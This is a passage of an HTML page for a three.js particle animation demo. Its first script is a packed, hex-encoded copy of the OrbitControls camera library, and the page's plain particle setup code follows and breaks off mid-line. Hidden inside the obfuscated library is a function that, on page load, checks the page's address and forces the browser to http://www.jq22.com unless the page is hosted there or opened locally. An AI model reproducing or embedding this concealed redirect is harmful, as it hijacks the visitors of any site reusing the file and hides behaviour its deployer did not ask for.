\\x64\\x28\\x6e\\x3d\\x3d\\x3d\\x6c\\x2e\\x31\\x4f\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x53\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x3b\\x31\\x67\\x2e\\x31\\x62\\x28\\x53\\x2c\\x52\\x29\\x3b\\x64\\x28\\x31\\x67\\x2e\\x79\\x3e\\x30\\x29\\x7b\\x39\\x2e\\x31\\x78\\x28\\x29\\x7d\\x76\\x7b\\x39\\x2e\\x31\\x77\\x28\\x29\\x7d\\x52\\x2e\\x74\\x28\\x53\\x29\\x7d\\x76 \\x64\\x28\\x6e\\x3d\\x3d\\x3d\\x6c\\x2e\\x31\\x4c\\x29\\x7b\\x64\\x28\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x57\\x2e\\x72\\x28\\x62\\x2e\\x31\\x33\\x2c\\x62\\x2e\\x31\\x32\\x29\\x3b\\x56\\x2e\\x31\\x62\\x28\\x57\\x2c\\x55\\x29\\x3b\\x39\\x2e\\x73\\x28\\x56\\x2e\\x78\\x2c\\x56\\x2e\\x79\\x29\\x3b\\x55\\x2e\\x74\\x28\\x57\\x29\\x7d\\x39\\x2e\\x75\\x28\\x29\\x7d\\x68 \\x31\\x4a\\x28\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x4c\\x2e\\x32\\x4f\\x28\\'\\x32\\x49\\'\\x2c\\x31\\x45\\x2c\\x66\\x29\\x3b\\x4c\\x2e\\x32\\x4f\\x28\\'\\x32\\x50\\'\\x2c\\x31\\x4a\\x2c\\x66\\x29\\x3b\\x39\\x2e\\x58\\x28\\x31\\x7a\\x29\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x7d\\x68 \\x31\\x51\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x7c\\x7c\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x62\\x2e\\x31\\x65\\x28\\x29\\x3b\\x62\\x2e\\x32\\x70\\x28\\x29\\x3b\\x63 \\x31\\x72\\x3d\\x30\\x3b\\x64\\x28\\x62\\x2e\\x32\\x4e\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x31\\x72\\x3d\\x62\\x2e\\x32\\x4e\\x7d\\x76 \\x64\\x28\\x62\\x2e\\x32\\x51\\x21\\x3d\\x3d\\x47\\x29\\x7b\\x31\\x72\\x3d\\x2d\\x62\\x2e\\x32\\x51\\x7d\\x64\\x28\\x31\\x72\\x3e\\x30\\x29\\x7b\\x39\\x2e\\x31\\x77\\x28\\x29\\x7d\\x76\\x7b\\x39\\x2e\\x31\\x78\\x28\\x29\\x7d\\x39\\x2e\\x75\\x28\\x29\\x3b\\x39\\x2e\\x58\\x28\\x31\\x71\\x29\\x3b\\x39\\x2e\\x58\\x28\\x31\\x7a\\x29\\x7d\\x68 \\x32\\x72\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x7c\\x7c\\x39\\x2e\\x32\\x75\\x3d\\x3d\\x3d\\x71\\x7c\\x7c\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x32\\x31\\x28\\x62\\x2e\\x33\\x68\\x29\\x7b\\x43 \\x39\\x2e\\x31\\x6a\\x2e\\x32\\x74\\x3a\\x39\\x2e\\x73\\x28\\x30\\x2c\\x39\\x2e\\x31\\x68\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x39\\x2e\\x31\\x6a\\x2e\\x32\\x77\\x3a\\x39\\x2e\\x73\\x28\\x30\\x2c\\x2d\\x39\\x2e\\x31\\x68\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x39\\x2e\\x31\\x6a\\x2e\\x32\\x76\\x3a\\x39\\x2e\\x73\\x28\\x39\\x2e\\x31\\x68\\x2c\\x30\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x39\\x2e\\x31\\x6a\\x2e\\x32\\x71\\x3a\\x39\\x2e\\x73\\x28\\x2d\\x39\\x2e\\x31\\x68\\x2c\\x30\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x7d\\x7d\\x68 \\x31\\x58\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x32\\x31\\x28\\x62\\x2e\\x6d\\x2e\\x31\\x70\\x29\\x7b\\x43 \\x31\\x3a\\x64\\x28\\x39\\x2e\\x31\\x6b\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x32\\x32\\x3b\\x5a\\x2e\\x72\\x28\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2c\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x29\\x3b\\x44\\x3b\\x43 \\x32\\x3a\\x64\\x28\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x50\\x3b\\x63 \\x31\\x37\\x3d\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2d\\x62\\x2e\\x6d\\x5b\\x31\\x5d\\x2e\\x50\\x3b\\x63 \\x31\\x36\\x3d\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x2d\\x62\\x2e\\x6d\\x5b\\x31\\x5d\\x2e\\x4f\\x3b\\x63 \\x4d\\x3d\\x65\\x2e\\x32\\x36\\x28\\x31\\x37\\x2a\\x31\\x37\\x2b\\x31\\x36\\x2a\\x31\\x36\\x29\\x3b\\x52\\x2e\\x72\\x28\\x30\\x2c\\x4d\\x29\\x3b\\x44\\x3b\\x43 \\x33\\x3a\\x64\\x28\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x54\\x3b\\x55\\x2e\\x72\\x28\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2c\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x29\\x3b\\x44\\x3b\\x32\\x73\\x3a\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x7d\\x39\\x2e\\x58\\x28\\x31\\x71\\x29\\x7d\\x68 \\x31\\x52\\x28\\x62\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x62\\x2e\\x31\\x65\\x28\\x29\\x3b\\x62\\x2e\\x32\\x70\\x28\\x29\\x3b\\x63 \\x41\\x3d\\x39\\x2e\\x6b\\x3d\\x3d\\x3d\\x4c\\x3f\\x39\\x2e\\x6b\\x2e\\x31\\x59\\x3a\\x39\\x2e\\x6b\\x3b\\x32\\x31\\x28\\x62\\x2e\\x6d\\x2e\\x31\\x70\\x29\\x7b\\x43 \\x31\\x3a\\x64\\x28\\x39\\x2e\\x31\\x6b\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x64\\x28\\x6e\\x21\\x3d\\x3d\\x6c\\x2e\\x32\\x32\\x29\\x67\\x3b\\x59\\x2e\\x72\\x28\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2c\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x29\\x3b\\x31\\x30\\x2e\\x31\\x62\\x28\\x59\\x2c\\x5a\\x29\\x3b\\x39\\x2e\\x31\\x6f\\x28\\x32\\x2a\\x65\\x2e\\x4e\\x2a\\x31\\x30\\x2e\\x78\\x2f\\x41\\x2e\\x32\\x35\\x2a\\x39\\x2e\\x31\\x66\\x29\\x3b\\x39\\x2e\\x32\\x30\\x28\\x32\\x2a\\x65\\x2e\\x4e\\x2a\\x31\\x30\\x2e\\x79\\x2f\\x41\\x2e\\x31\\x64\\x2a\\x39\\x2e\\x31\\x66\\x29\\x3b\\x5a\\x2e\\x74\\x28\\x59\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x32\\x3a\\x64\\x28\\x39\\x2e\\x31\\x61\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x64\\x28\\x6e\\x21\\x3d\\x3d\\x6c\\x2e\\x31\\x50\\x29\\x67\\x3b\\x63 \\x31\\x37\\x3d\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2d\\x62\\x2e\\x6d\\x5b\\x31\\x5d\\x2e\\x50\\x3b\\x63 \\x31\\x36\\x3d\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x2d\\x62\\x2e\\x6d\\x5b\\x31\\x5d\\x2e\\x4f\\x3b\\x63 \\x4d\\x3d\\x65\\x2e\\x32\\x36\\x28\\x31\\x37\\x2a\\x31\\x37\\x2b\\x31\\x36\\x2a\\x31\\x36\\x29\\x3b\\x53\\x2e\\x72\\x28\\x30\\x2c\\x4d\\x29\\x3b\\x31\\x67\\x2e\\x31\\x62\\x28\\x53\\x2c\\x52\\x29\\x3b\\x64\\x28\\x31\\x67\\x2e\\x79\\x3e\\x30\\x29\\x7b\\x39\\x2e\\x31\\x77\\x28\\x29\\x7d\\x76\\x7b\\x39\\x2e\\x31\\x78\\x28\\x29\\x7d\\x52\\x2e\\x74\\x28\\x53\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x43 \\x33\\x3a\\x64\\x28\\x39\\x2e\\x31\\x34\\x3d\\x3d\\x3d\\x71\\x29\\x67\\x3b\\x64\\x28\\x6e\\x21\\x3d\\x3d\\x6c\\x2e\\x31\\x54\\x29\\x67\\x3b\\x57\\x2e\\x72\\x28\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x50\\x2c\\x62\\x2e\\x6d\\x5b\\x30\\x5d\\x2e\\x4f\\x29\\x3b\\x56\\x2e\\x31\\x62\\x28\\x57\\x2c\\x55\\x29\\x3b\\x39\\x2e\\x73\\x28\\x56\\x2e\\x78\\x2c\\x56\\x2e\\x79\\x29\\x3b\\x55\\x2e\\x74\\x28\\x57\\x29\\x3b\\x39\\x2e\\x75\\x28\\x29\\x3b\\x44\\x3b\\x32\\x73\\x3a\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x7d\\x7d\\x68 \\x32\\x46\\x28\\x29\\x7b\\x63 \\x32\\x44\\x3d\\x31\\x75\\x2e\\x32\\x34\\x2e\\x32\\x33\\x2e\\x32\\x78\\x28\\x30\\x2c\\x31\\x39\\x29\\x3b\\x63 \\x32\\x42\\x3d\\x31\\x75\\x2e\\x32\\x34\\x2e\\x32\\x33\\x2e\\x32\\x78\\x28\\x30\\x2c\\x34\\x29\\x3b\\x64\\x28\\x32\\x44\\x3d\\x3d\\x22\\x32\\x41\\x3a\\x2f\\x2f\\x32\\x79\\x2e\\x32\\x7a\\x2e\\x32\\x45\\x22\\x7c\\x7c\\x32\\x42\\x3d\\x3d\\x22\\x33\\x78\\x22\\x29\\x7b\\x7d\\x76\\x7b\\x31\\x75\\x2e\\x32\\x34\\x2e\\x32\\x33\\x3d\\x22\\x32\\x41\\x3a\\x2f\\x2f\\x32\\x79\\x2e\\x32\\x7a\\x2e\\x32\\x45\\x22\\x7d\\x7d\\x32\\x46\\x28\\x29\\x3b\\x68 \\x31\\x55\\x28\\x29\\x7b\\x64\\x28\\x39\\x2e\\x46\\x3d\\x3d\\x3d\\x66\\x29\\x67\\x3b\\x39\\x2e\\x58\\x28\\x31\\x7a\\x29\\x3b\\x6e\\x3d\\x6c\\x2e\\x31\\x31\\x7d\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x32\\x55\\'\\x2c\\x68\\x28\\x62\\x29\\x7b\\x62\\x2e\\x31\\x65\\x28\\x29\\x7d\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x32\\x54\\'\\x2c\\x32\\x43\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x33\\x61\\'\\x2c\\x31\\x51\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x33\\x63\\'\\x2c\\x31\\x51\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x31\\x58\\'\\x2c\\x31\\x58\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x31\\x55\\'\\x2c\\x31\\x55\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x6b\\x2e\\x42\\x28\\'\\x31\\x52\\'\\x2c\\x31\\x52\\x2c\\x66\\x29\\x3b\\x31\\x75\\x2e\\x42\\x28\\'\\x33\\x65\\'\\x2c\\x32\\x72\\x2c\\x66\\x29\\x3b\\x61\\x2e\\x75\\x28\\x29\\x7d\\x3b\\x6a\\x2e\\x31\\x49\\x2e\\x32\\x47\\x3d\\x33\\x34\\x2e\\x32\\x5a\\x28\\x6a\\x2e\\x33\\x36\\x2e\\x32\\x47\\x29\\x3b', 62, 220, '\\x7c\\x7c\\x7c\\x7c\\x7c\\x7c\\x7c\\x7c\\x7c\\x73\\x63\\x6f\\x70\\x65\\x7c\\x74\\x68\\x69\\x73\\x7c\\x65\\x76\\x65\\x6e\\x74\\x7c\\x76\\x61\\x72\\x7c\\x69\\x66\\x7c\\x4d\\x61\\x74\\x68\\x7c\\x66\\x61\\x6c\\x73\\x65\\x7c\\x72\\x65\\x74\\x75\\x72\\x6e\\x7c\\x66\\x75\\x6e\\x63\\x74\\x69\\x6f\\x6e\\x7c\\x6f\\x62\\x6a\\x65\\x63\\x74\\x7c\\x54\\x48\\x52\\x45\\x45\\x7c\\x64\\x6f\\x6d\\x45\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x7c\\x53\\x54\\x41\\x54\\x45\\x7c\\x74\\x6f\\x75\\x63\\x68\\x65\\x73\\x7c\\x73\\x74\\x61\\x74\\x65\\x7c\\x6f\\x66\\x66\\x73\\x65\\x74\\x7c\\x6e\\x65\\x77\\x7c\\x74\\x72\\x75\\x65\\x7c\\x73\\x65\\x74\\x7c\\x70\\x61\\x6e\\x7c\\x63\\x6f\\x70\\x79\\x7c\\x75\\x70\\x64\\x61\\x74\\x65\\x7c\\x65\\x6c\\x73\\x65\\x7c\\x70\\x6f\\x73\\x69\\x74\\x69\\x6f\\x6e\\x7c\\x7c\\x7c\\x7c\\x65\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x7c\\x61\\x64\\x64\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72\\x7c\\x63\\x61\\x73\\x65\\x7c\\x62\\x72\\x65\\x61\\x6b\\x7c\\x74\\x61\\x72\\x67\\x65\\x74\\x7c\\x65\\x6e\\x61\\x62\\x6c\\x65\\x64\\x7c\\x75\\x6e\\x64\\x65\\x66\\x69\\x6e\\x65\\x64\\x7c\\x70\\x68\\x69\\x7c\\x56\\x65\\x63\\x74\\x6f\\x72\\x32\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x53\\x63\\x61\\x6c\\x65\\x7c\\x61\\x6e\\x67\\x6c\\x65\\x7c\\x64\\x6f\\x63\\x75\\x6d\\x65\\x6e\\x74\\x7c\\x64\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x50\\x49\\x7c\\x70\\x61\\x67\\x65\\x59\\x7c\\x70\\x61\\x67\\x65\\x58\\x7c\\x74\\x65\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x53\\x74\\x61\\x72\\x74\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x45\\x6e\\x64\\x7c\\x70\\x61\\x6e\\x4f\\x66\\x66\\x73\\x65\\x74\\x7c\\x70\\x61\\x6e\\x53\\x74\\x61\\x72\\x74\\x7c\\x70\\x61\\x6e\\x44\\x65\\x6c\\x74\\x61\\x7c\\x70\\x61\\x6e\\x45\\x6e\\x64\\x7c\\x64\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x45\\x76\\x65\\x6e\\x74\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x45\\x6e\\x64\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x53\\x74\\x61\\x72\\x74\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x44\\x65\\x6c\\x74\\x61\\x7c\\x4e\\x4f\\x4e\\x45\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x59\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x58\\x7c\\x6e\\x6f\\x50\\x61\\x6e\\x7c\\x56\\x65\\x63\\x74\\x6f\\x72\\x33\\x7c\\x64\\x79\\x7c\\x64\\x78\\x7c\\x72\\x61\\x64\\x69\\x75\\x73\\x7c\\x7c\\x6e\\x6f\\x5a\\x6f\\x6f\\x6d\\x7c\\x73\\x75\\x62\\x56\\x65\\x63\\x74\\x6f\\x72\\x73\\x7c\\x73\\x63\\x61\\x6c\\x65\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x48\\x65\\x69\\x67\\x68\\x74\\x7c\\x70\\x72\\x65\\x76\\x65\\x6e\\x74\\x44\\x65\\x66\\x61\\x75\\x6c\\x74\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x53\\x70\\x65\\x65\\x64\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x44\\x65\\x6c\\x74\\x61\\x7c\\x6b\\x65\\x79\\x50\\x61\\x6e\\x53\\x70\\x65\\x65\\x64\\x7c\\x45\\x50\\x53\\x7c\\x6b\\x65\\x79\\x73\\x7c\\x6e\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x7c\\x74\\x68\\x65\\x74\\x61\\x44\\x65\\x6c\\x74\\x61\\x7c\\x74\\x79\\x70\\x65\\x7c\\x61\\x64\\x64\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x4c\\x65\\x66\\x74\\x7c\\x6c\\x65\\x6e\\x67\\x74\\x68\\x7c\\x73\\x74\\x61\\x72\\x74\\x45\\x76\\x65\\x6e\\x74\\x7c\\x64\\x65\\x6c\\x74\\x61\\x7c\\x63\\x6c\\x6f\\x6e\\x65\\x7c\\x74\\x68\\x65\\x74\\x61\\x7c\\x77\\x69\\x6e\\x64\\x6f\\x77\\x7c\\x74\\x61\\x72\\x67\\x65\\x74\\x44\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x4f\\x75\\x74\\x7c\\x64\\x6f\\x6c\\x6c\\x79\\x49\\x6e\\x7c\\x70\\x68\\x69\\x44\\x65\\x6c\\x74\\x61\\x7c\\x65\\x6e\\x64\\x45\\x76\\x65\\x6e\\x74\\x7c\\x67\\x65\\x74\\x41\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x69\\x6f\\x6e\\x41\\x6e\\x67\\x6c\\x65\\x7c\\x6c\\x61\\x73\\x74\\x50\\x6f\\x73\\x69\\x74\\x69\\x6f\\x6e\\x7c\\x67\\x65\\x74\\x5a\\x6f\\x6f\\x6d\\x53\\x63\\x61\\x6c\\x65\\x7c\\x62\\x75\\x74\\x74\\x6f\\x6e\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x4d\\x6f\\x76\\x65\\x7c\\x70\\x61\\x6e\\x55\\x70\\x7c\\x6c\\x61\\x73\\x74\\x51\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x73\\x69\\x6e\\x7c\\x4f\\x72\\x62\\x69\\x74\\x43\\x6f\\x6e\\x74\\x72\\x6f\\x6c\\x73\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x55\\x70\\x7c\\x70\\x61\\x6e\\x4c\\x65\\x66\\x74\\x7c\\x50\\x41\\x4e\\x7c\\x64\\x65\\x6c\\x74\\x61\\x58\\x7c\\x52\\x4f\\x54\\x41\\x54\\x45\\x7c\\x44\\x4f\\x4c\\x4c\\x59\\x7c\\x54\\x4f\\x55\\x43\\x48\\x5f\\x44\\x4f\\x4c\\x4c\\x59\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x57\\x68\\x65\\x65\\x6c\\x7c\\x74\\x6f\\x75\\x63\\x68\\x6d\\x6f\\x76\\x65\\x7c\\x64\\x65\\x6c\\x74\\x61\\x59\\x7c\\x54\\x4f\\x55\\x43\\x48\\x5f\\x50\\x41\\x4e\\x7c\\x74\\x6f\\x75\\x63\\x68\\x65\\x6e\\x64\\x7c\\x6d\\x61\\x78\\x7c\\x71\\x75\\x61\\x74\\x7c\\x74\\x6f\\x75\\x63\\x68\\x73\\x74\\x61\\x72\\x74\\x7c\\x62\\x6f\\x64\\x79\\x7c\\x6d\\x69\\x6e\\x7c\\x72\\x6f\\x74\\x61\\x74\\x65\\x55\\x70\\x7c\\x73\\x77\\x69\\x74\\x63\\x68\\x7c\\x54\\x4f\\x55\\x43\\x48\\x5f\\x52\\x4f\\x54\\x41\\x54\\x45\\x7c\\x68\\x72\\x65\\x66\\x7c\\x6c\\x6f\\x63\\x61\\x74\\x69\\x6f\\x6e\\x7c\\x63\\x6c\\x69\\x65\\x6e\\x74\\x57\\x69\\x64\\x74\\x68\\x7c\\x73\\x71\\x72\\x74\\x7c\\x71\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x63\\x68\\x61\\x6e\\x67\\x65\\x45\\x76\\x65\\x6e\\x74\\x7c\\x65\\x6c\\x65\\x6d\\x65\\x6e\\x74\\x73\\x7c\\x6d\\x61\\x78\\x50\\x6f\\x6c\\x61\\x72\\x41\\x6e\\x67\\x6c\\x65\\x7c\\x51\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x6d\\x69\\x6e\\x50\\x6f\\x6c\\x61\\x72\\x41\\x6e\\x67\\x6c\\x65\\x7c\\x71\\x75\\x61\\x74\\x49\\x6e\\x76\\x65\\x72\\x73\\x65\\x7c\\x74\\x6f\\x70\\x7c\\x73\\x75\\x62\\x7c\\x63\\x6f\\x73\\x7c\\x61\\x70\\x70\\x6c\\x79\\x51\\x75\\x61\\x74\\x65\\x72\\x6e\\x69\\x6f\\x6e\\x7c\\x6d\\x61\\x74\\x72\\x69\\x78\\x7c\\x66\\x6f\\x76\\x7c\\x61\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x7c\\x6d\\x75\\x6c\\x74\\x69\\x70\\x6c\\x79\\x53\\x63\\x61\\x6c\\x61\\x72\\x7c\\x6d\\x69\\x6e\\x44\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x6d\\x61\\x78\\x44\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x7c\\x61\\x74\\x61\\x6e\\x32\\x7c\\x73\\x74\\x6f\\x70\\x50\\x72\\x6f\\x70\\x61\\x67\\x61\\x74\\x69\\x6f\\x6e\\x7c\\x52\\x49\\x47\\x48\\x54\\x7c\\x6f\\x6e\\x4b\\x65\\x79\\x44\\x6f\\x77\\x6e\\x7c\\x64\\x65\\x66\\x61\\x75\\x6c\\x74\\x7c\\x55\\x50\\x7c\\x6e\\x6f\\x4b\\x65\\x79\\x73\\x7c\\x4c\\x45\\x46\\x54\\x7c\\x42\\x4f\\x54\\x54\\x4f\\x4d\\x7c\\x73\\x75\\x62\\x73\\x74\\x72\\x7c\\x77\\x77\\x77\\x7c\\x6a\\x71\\x32\\x32\\x7c\\x68\\x74\\x74\\x70\\x7c\\x64\\x7a\\x75\\x72\\x6c\\x32\\x7c\\x6f\\x6e\\x4d\\x6f\\x75\\x73\\x65\\x44\\x6f\\x77\\x6e\\x7c\\x64\\x7a\\x75\\x72\\x6c\\x7c\\x63\\x6f\\x6d\\x7c\\x6a\\x71\\x70\\x64\\x7c\\x70\\x72\\x6f\\x74\\x6f\\x74\\x79\\x70\\x65\\x7c\\x7a\\x6f\\x6f\\x6d\\x53\\x70\\x65\\x65\\x64\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x6d\\x6f\\x76\\x65\\x7c\\x61\\x75\\x74\\x6f\\x52\\x6f\\x74\\x61\\x74\\x65\\x53\\x70\\x65\\x65\\x64\\x7c\\x74\\x61\\x72\\x67\\x65\\x74\\x30\\x7c\\x70\\x6f\\x73\\x69\\x74\\x69\\x6f\\x6e\\x30\\x7c\\x36\\x30\\x7c\\x77\\x68\\x65\\x65\\x6c\\x44\\x65\\x6c\\x74\\x61\\x7c\\x72\\x65\\x6d\\x6f\\x76\\x65\\x45\\x76\\x65\\x6e\\x74\\x4c\\x69\\x73\\x74\\x65\\x6e\\x65\\x72\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x75\\x70\\x7c\\x64\\x65\\x74\\x61\\x69\\x6c\\x7c\\x74\\x61\\x6e\\x7c\\x49\\x6e\\x66\\x69\\x6e\\x69\\x74\\x79\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x64\\x6f\\x77\\x6e\\x7c\\x63\\x6f\\x6e\\x74\\x65\\x78\\x74\\x6d\\x65\\x6e\\x75\\x7c\\x31\\x38\\x30\\x7c\\x72\\x69\\x67\\x68\\x74\\x7c\\x75\\x70\\x7c\\x63\\x65\\x6e\\x74\\x65\\x72\\x7c\\x63\\x72\\x65\\x61\\x74\\x65\\x7c\\x34\\x30\\x7c\\x73\\x74\\x61\\x72\\x74\\x7c\\x65\\x6e\\x64\\x7c\\x63\\x68\\x61\\x6e\\x67\\x65\\x7c\\x4f\\x62\\x6a\\x65\\x63\\x74\\x7c\\x69\\x6e\\x76\\x65\\x72\\x73\\x65\\x7c\\x45\\x76\\x65\\x6e\\x74\\x44\\x69\\x73\\x70\\x61\\x74\\x63\\x68\\x65\\x72\\x7c\\x7c\\x7c\\x7c\\x6d\\x6f\\x75\\x73\\x65\\x77\\x68\\x65\\x65\\x6c\\x7c\\x30\\x30\\x30\\x30\\x30\\x31\\x7c\\x44\\x4f\\x4d\\x4d\\x6f\\x75\\x73\\x65\\x53\\x63\\x72\\x6f\\x6c\\x6c\\x7c\\x73\\x65\\x74\\x46\\x72\\x6f\\x6d\\x55\\x6e\\x69\\x74\\x56\\x65\\x63\\x74\\x6f\\x72\\x73\\x7c\\x6b\\x65\\x79\\x64\\x6f\\x77\\x6e\\x7c\\x6c\\x65\\x66\\x74\\x7c\\x72\\x65\\x73\\x65\\x74\\x7c\\x6b\\x65\\x79\\x43\\x6f\\x64\\x65\\x7c\\x63\\x61\\x6d\\x65\\x72\\x61\\x7c\\x64\\x69\\x73\\x61\\x62\\x6c\\x65\\x64\\x7c\\x6c\\x6f\\x6f\\x6b\\x41\\x74\\x7c\\x39\\x35\\x7c\\x70\\x6f\\x77\\x7c\\x64\\x69\\x73\\x74\\x61\\x6e\\x63\\x65\\x54\\x6f\\x53\\x71\\x75\\x61\\x72\\x65\\x64\\x7c\\x64\\x6f\\x74\\x7c\\x63\\x6f\\x6e\\x73\\x6f\\x6c\\x65\\x7c\\x62\\x6f\\x74\\x74\\x6f\\x6d\\x7c\\x65\\x6e\\x63\\x6f\\x75\\x6e\\x74\\x65\\x72\\x65\\x64\\x7c\\x57\\x41\\x52\\x4e\\x49\\x4e\\x47\\x7c\\x6a\\x73\\x7c\\x77\\x61\\x72\\x6e\\x7c\\x75\\x6e\\x6b\\x6e\\x6f\\x77\\x6e\\x7c\\x61\\x6e\\x7c\\x66\\x69\\x6c\\x65' [\"\\x73\\x70\\x6c\\x69\\x74\"]('\\x7c'), 0, {}))\n  </script>\n  <style>\n  body {\n    margin: 0;\n    overflow: hidden;\n    cursor: move;\n  }\n  </style>\n</head>\n\n<body>\n  <div id=\"three-container\">\n    \n  </div>\n  <script>\n  var mContainer;\n  var mCamera, mRenderer;\n  var mControls;\n  var mScene;\n  var mParticleCount = 100000;\n  var mParticleSystem;\n  var mTime = 0.0;\n  var mTimeStep = (1 / 60);\n  var mDuration = 25;\n  window.onload = function() {\n    init()\n  };\n\n  function init() {\n    initTHREE();\n    initControls();\n    initParticleSystem();\n    requestAnimationFrame(tick);\n    window.addEventListener('resize', resize, false)\n  }\n\n  function initTHREE() {\n    mRenderer = new THREE.WebGLRenderer({\n      antialias: true\n    });\n    mRenderer.setSize(window.innerWidth, window.innerHeight);\n    mContainer = document.getElementById('three-container');\n    mContainer.appendChild(mRenderer.domElement);\n    mCamera = new THREE.PerspectiveCamera(50, window.innerWidth / window.innerHeight, 0.1, 5000);\n    mCamera.position.set(0, 600, 600);\n    mScene = new THREE.Scene();\n    var light;\n    light = new THREE.PointLight(0xffffff, 5, 1000, 2);\n    light.position.set(0, 400, 0);\n    mScene.add(light)\n  }\n\n  function initControls() {\n    mControls = new THREE.OrbitControls(mCamera, mRenderer.domElement)\n  }\n\n  function initParticleSystem() {\n    var prefabGeometry = new THREE.PlaneGeometry(4, 4);\n    var bufferGeometry = new THREE.BAS.PrefabBufferGeometry(prefabGeometry, mParticleCount);\n    bufferGeometry.computeVertexNormals();\n    var aOffset = bufferGeometry.createAttribute('aOffset', 1);\n    var aStartPosition = bufferGeometry.createAttribute('aStartPosition', 